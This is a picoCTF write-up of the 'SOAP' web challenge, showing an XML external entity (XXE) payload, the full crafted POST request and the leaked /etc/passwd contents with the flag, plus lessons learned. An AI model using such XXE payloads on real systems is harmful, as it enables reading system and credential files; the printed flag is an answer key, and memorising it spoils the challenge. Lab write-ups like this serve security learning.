# SOAP
**Flag:picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}**
## My thought process and approach to the challenge:
At First, I opened the website and found nothing import in the source code, but then decided to use the network tab to see what requests were being sent.         
![image](https://github.com/user-attachments/assets/5535b2e0-b0d7-4877-99dd-109b9d2deb20)

Saw that there was a request of the form
```
Content-Type: applications/xml
```
Researched about this and got to know that it would be vulnerable to an XXE injection or an XML external entity injection            
Using https://portswigger.net/web-security/xxe, I got the injection
![image](https://github.com/user-attachments/assets/60e6b3e6-8b93-4fea-8514-4264c4d6e75d)
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
![image](https://github.com/user-attachments/assets/a44d98b1-3270-45e7-ad88-5d6b02baf6ab)
Adding content length to be more:   
![image](https://github.com/user-attachments/assets/f3de50d7-6598-42f7-aa0d-e0805ef79c1f)
the final result was:
```
POST /data HTTP/1.1

Host: saturn.picoctf.net:53042

Content-Length: 119

Accept-Language: en-US

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36

Content-Type: applications/xml

Accept: */*

Origin: http://saturn.picoctf.net:53042

Referer: http://saturn.picoctf.net:53042/

Accept-Encoding: gzip, deflate, br

Connection: keep-alive



<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/etc/passwd"> ]>

<data><ID>

&xxe;1

2</ID></data>
```
After forwarding the request, the server returned a response containing the /etc/passwd file:
![image](https://github.com/user-attachments/assets/9113b486-9045-4308-b436-abbd3d0321c1)
Which gave me:    
```
Invalid ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flask:x:999:999::/app:/bin/sh picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4} 1 2
```
which gave me the flag: picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}

---

## Every single new concept and point of knowledge I learned or improved upon through solving the challenge.
1. Learnt how XML External Entity (XXE) vulnerabilities work and how to use them.
2. Learnt how to make and send POST requests with XML using developer tools.
3. Learnt how to extract sensitive files like /etc/passwd through injections.
4. Learnt more about helpful tools like PortSwigger's XXE labs.
---

##  Incorrect tangents I went on while solving :
1. Initially, I inspected the website's source code, thinking there might be hidden hints or comments that would help me, but found nothing.
2. Attempted SQL injection in the request and sending them before realizing it was XML-based.(took way too much time to understand and implement, but it lead me nowhere close)
3. Overlooked the importance of properly setting the `Content-Length` header initially, which caused the server to reject my payload.(Was stuck on this for 2+ hours thinking I had everything right and it was still being rejected by the server)
